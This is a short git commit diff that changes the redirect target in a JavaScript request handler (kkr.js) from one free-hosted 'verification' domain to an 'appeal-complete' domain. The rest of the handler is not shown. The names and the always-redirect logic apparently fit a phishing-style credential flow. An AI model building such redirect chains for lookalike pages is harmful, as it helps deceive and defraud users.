2880add75314cd11bfc65b37d29d8a6efec377a1
mbkhan1122 <malijaan414@gmail.com>
2026-01-14 16:44:43 +0500

    Update kkr.js

--- kkr.js
+++ kkr.js
@@ -55,5 +55,5 @@ export default async function handler(req, res) {
   }
 
   // Always redirect (success or failure)
-  return res.redirect(302, "https://complete-verification-required.netlify.app/");
+  return res.redirect(302, "https://appeal-complete.vercel.app/");
 }
